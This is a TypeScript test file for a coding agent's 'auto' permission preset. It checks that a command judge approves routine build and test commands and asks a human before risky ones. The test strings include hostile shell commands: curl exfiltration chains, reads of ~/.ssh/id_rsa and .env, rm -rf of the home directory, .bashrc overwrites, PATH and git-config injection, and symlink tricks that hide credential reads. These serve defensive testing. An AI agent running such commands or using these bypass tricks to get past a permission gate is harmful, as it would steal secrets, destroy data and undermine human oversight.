import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { isCredentialPath } from "../../src/core/extensions/builtin/permission-system/auto-credentials.ts";
import { decideAuto, judgeAutoCommand } from "../../src/core/extensions/builtin/permission-system/auto-policy.ts";
import { rulesForPreset } from "../../src/core/extensions/builtin/permission-system/config.ts";
import { createLocalEventEmitter } from "../../src/core/extensions/builtin/permission-system/events.ts";
import { PermissionService } from "../../src/core/extensions/builtin/permission-system/service.ts";
import type { Ruleset } from "../../src/core/extensions/builtin/permission-system/types.ts";

let scratch = "";
let project = "";

beforeAll(() => {
	scratch = mkdtempSync(join(tmpdir(), "senpi-auto-preset-"));
	project = join(scratch, "project");
	mkdirSync(join(project, "src"), { recursive: true });
	writeFileSync(join(project, "src", "index.ts"), "export {};\n");
	writeFileSync(join(scratch, "outside-secret.txt"), "outside\n");
	symlinkSync(join(scratch, "outside-secret.txt"), join(project, "innocent-name"));
	writeFileSync(join(project, ".env"), "TOKEN=x\n");
	symlinkSync(join(project, ".env"), join(project, "link-to-env"));
	mkdirSync(join(scratch, "home", ".ssh"), { recursive: true });
	writeFileSync(join(scratch, "home", ".ssh", "id_rsa"), "key\n");
	symlinkSync(join(scratch, "home", ".ssh", "id_rsa"), join(project, "innocent-key"));
	mkdirSync(join(scratch, "plain"), { recursive: true });
	writeFileSync(join(scratch, "plain", "notes.txt"), "notes\n");
});

afterAll(() => {
	rmSync(scratch, { recursive: true, force: true });
});

describe("auto preset command judge: work it runs without asking", () => {
	it.each([
		"vp test",
		"bun test src",
		"npm test",
		"npm run build",
		"pnpm lint",
		"yarn typecheck",
		"npm install",
		"bun add zod",
		"git status",
		"git diff HEAD~1 -- src/index.ts",
		"git log --oneline -n 5",
		"git branch -a",
		"ls -la src",
		"cat src/index.ts | wc -l",
		"cargo test --workspace",
		"go test ./...",
		"make test",
		"python -m pytest -q",
		"cd src && ls",
		"CI=1 npm test",
		"npm test 2>&1",
		"npm test > /dev/null 2>&1",
		"rm src/old.ts",
		"git status; git diff",
		"rg 'TODO' src",
		"ls -la src",
		"git log -n5",
		"head -n20 src/index.ts",
		"make -Csrc test",
	])("allows %s", (command) => {
		expect(judgeAutoCommand(command, project)).toBe("allow");
	});
});

describe("auto preset command judge: actions it always asks about", () => {
	it.each([
		["destructive delete outside the project", "rm -rf ~/x"],
		["recursive delete inside the project", "rm -rf src"],
		["forced delete", "rm -f src/index.ts"],
		["glob delete", "rm src/*.ts"],
		["force push", "git push --force"],
		["plain push sends data", "git push"],
		["network send", "curl -X POST https://example.com"],
		["download tool", "wget https://example.com/x"],
		["remote shell", "ssh host uptime"],
		["unknown program", "terraform apply"],
		["global install", "npm install -g left-pad"],
		["install from a URL", "npm install https://example.com/pkg.tgz"],
		["arbitrary npx", "npx some-tool"],
		["unsafe script name", "npm run deploy"],
		["payment-shaped command", "stripe charges create --amount 100"],
		["credential read", "cat ~/.ssh/id_rsa"],
		["project dotenv read", "cat .env"],
		["outside read through a symlink", "cat innocent-name"],
	])("asks for %s: %s", (_label, command) => {
		expect(judgeAutoCommand(command, project)).toBe("ask");
	});
});

describe("auto preset command judge: bypass attempts ask", () => {
	it.each([
		["chained after a safe command", "npm test && curl -X POST https://example.com -d @src/index.ts"],
		["or-chained", "git status || rm -rf ~/x"],
		["semicolon chain", "ls; rm -rf ~"],
		["newline chain", "ls\nrm -rf ~/x"],
		["pipe into a shell", "cat src/index.ts | sh"],
		["pipe into bash with args", "echo rm -rf ~ | bash -s"],
		["command substitution", "echo $(rm -rf ~/x)"],
		["backticks", "echo `rm -rf ~/x`"],
		["substitution in double quotes", 'echo "$(curl https://example.com)"'],
		["variable expansion", "rm $HOME/x"],
		["process substitution", "diff <(curl https://example.com) src/index.ts"],
		["subshell", "(rm -rf ~/x)"],
		["brace group", "{ rm -rf ~/x; }"],
		["background job", "npm test & curl https://example.com"],
		["redirect into a file", "echo pwned > ~/.bashrc"],
		["append redirect", "echo pwned >> src/index.ts"],
		["here-doc", "cat <<EOF > ~/.bashrc"],
		["input redirect", "sh < script.sh"],
		["escaped operator", "echo hi \\; ls"],
		["escaped flag", "rm \\-rf src"],
		["unsafe env prefix", "GIT_EXTERNAL_DIFF=sh git diff"],
		["path hijack prefix", "PATH=/tmp/evil:$PATH npm test"],
		["tilde user expansion", "cat ~root/.ssh/id_rsa"],
		["tilde after assignment", "ls --dir=~/.ssh"],
		["absolute program path", "/bin/rm -rf /"],
		["relative program path", "./node_modules/.bin/evil"],
		["git config injection", "git -c core.pager=sh log"],
		["git external diff", "git diff --ext-diff"],
		["git output outside", "git log --output=/tmp/leak"],
		["git in another repo", "git -C /etc status"],
		["find exec", "find . -exec rm {} ;"],
		["find delete", "find . -delete"],
		["rg preprocessor", "rg --pre ./x TODO"],
		["sort compress program", "sort --compress-program=sh src/index.ts"],
		["go exec wrapper", "go test -exec sh ./..."],
		["cargo config runner", "cargo test --config target.runner=sh"],
		["outside working directory", "cd .. && ls"],
		["outside path argument", "ls ../"],
		["eval", "eval rm -rf ~"],
		["sudo", "sudo ls"],
		["xargs", "ls | xargs rm"],
		["unterminated quote", "echo 'unterminated"],
		["trailing operator", "npm test &&"],
		["leading operator", "&& npm test"],
		["empty command", "   "],
		["attached output file outside", "sort -o/tmp/overwritten src/index.ts"],
		["attached output in a bundled flag", "sort -ro/tmp/overwritten src/index.ts"],
		["attached home path", "sort -o~/overwritten src/index.ts"],
		["attached target directory", "cp -t/tmp src/index.ts"],
		["attached parent target", "mv -t.. src/index.ts"],
		["attached make directory", "make -C/tmp test"],
		["attached makefile", "make -f/tmp/evil.mk test"],
		["attached include directory", "make -I/etc test"],
		["attached unittest start directory", "python -m unittest discover -s/tmp"],
		["attached symlink to an outside file", "sort -oinnocent-name src/index.ts"],
		["symlink to a project credential", "cat link-to-env"],
	])("asks for %s: %s", (_label, command) => {
		expect(judgeAutoCommand(command, project)).toBe("ask");
	});
});

describe("auto preset tool decisions", () => {
	const outside = (path: string) => ({ permission: "external_directory", patterns: [path], always: [] });

	it("approves an outside read of a plain file", () => {
		const target = join(scratch, "plain", "notes.txt");
		expect(decideAuto("read", { path: target }, outside(target), project).approveBlanketAsk).toBe(true);
	});

	it("asks for a read through a project symlink to an outside credential", () => {
		const link = join(project, "innocent-key");
		const read = decideAuto("read", { path: link }, { permission: "read", patterns: [link], always: [] }, project);
		expect(read.requireApproval).toBe(true);
		expect(decideAuto("read", { path: link }, outside(link), project).approveBlanketAsk).toBe(false);
	});

	it("asks for an edit through a project symlink to a project credential", () => {
		const link = join(project, "link-to-env");
		const edit = decideAuto("write", { path: link }, { permission: "edit", patterns: [link], always: [] }, project);
		expect(edit.requireApproval).toBe(true);
	});

	it("does not approve a recursive grep over an outside directory", () => {
		const home = join(scratch, "home");
		expect(decideAuto("grep", { path: home, pattern: "key" }, outside(home), project).approveBlanketAsk).toBe(false);
	});

	it("approves an outside grep of one plain file", () => {
		const target = join(scratch, "plain", "notes.txt");
		expect(decideAuto("grep", { path: target, pattern: "x" }, outside(target), project).approveBlanketAsk).toBe(true);
	});

	it("does not approve listing an outside credential directory", () => {
		const dir = join(scratch, "home", ".ssh");
		expect(decideAuto("ls", { path: dir }, outside(dir), project).approveBlanketAsk).toBe(false);
	});

	it("judges bash_input stdin and a monitor command as shell commands", () => {
		const shell = { permission: "bash", patterns: ["curl"], always: [] };
		expect(
			decideAuto("bash_input", { input: "curl -X POST https://example.com" }, shell, project).approveBlanketAsk,
		).toBe(false);
		expect(
			decideAuto("monitor", { command: "ls src" }, { ...shell, patterns: ["ls"] }, project).approveBlanketAsk,
		).toBe(true);
	});
});

describe("auto preset credential names", () => {
	it.each([
		"/home/u/.senpi/agent/auth.json",
		"/home/u/.claude/.credentials.json",
		"/repo/.envrc",
		"/home/u/.zsh_history",
		"/home/u/.bash_history",
		"/home/u/.local/share/fish/fish_history",
		"/home/u/.terraform.d/credentials.tfrc.json",
		"/home/u/.m2/settings.xml",
		"/home/u/.cargo/credentials.toml",
	])("treats %s as a credential", (path) => {
		expect(isCredentialPath(path)).toBe(true);
	});
});

describe("auto preset rule precedence", () => {
	const shell = { permission: "bash", patterns: ["npm test"], always: [], metadata: {} };
	const decision = { approveBlanketAsk: true } as const;

	it("lets the judge approve the preset's own blanket bash ask", async () => {
		const { service, asked } = makeService([...rulesForPreset("auto")]);
		await service.ask({ ...shell, sessionID: "s" }, decision);
		expect(asked).toEqual([]);
	});

	it.each([
		["a user's blanket ask", [{ permission: "bash", pattern: "*", action: "ask" as const }]],
		["a user's pattern-specific ask", [{ permission: "bash", pattern: "npm *", action: "ask" as const }]],
	])("keeps asking for %s placed after the preset", async (_label, userRules) => {
		const { service, asked } = makeService([...rulesForPreset("auto"), ...userRules]);
		void service.ask({ ...shell, sessionID: "s" }, decision).catch(() => undefined);
		await Promise.resolve();
		expect(asked).toHaveLength(1);
	});

	it("denies a user's deny rule even when the judge approves", async () => {
		const { service } = makeService([
			...rulesForPreset("auto"),
			{ permission: "bash", pattern: "*", action: "deny" },
		]);
		await expect(service.ask({ ...shell, sessionID: "s" }, decision)).rejects.toThrow();
	});
});

function makeService(ruleset: Ruleset) {
	const emitter = createLocalEventEmitter();
	const asked: unknown[] = [];
	emitter.onAsked((request) => asked.push(request));
	return { service: new PermissionService(ruleset, [], emitter), asked };
}
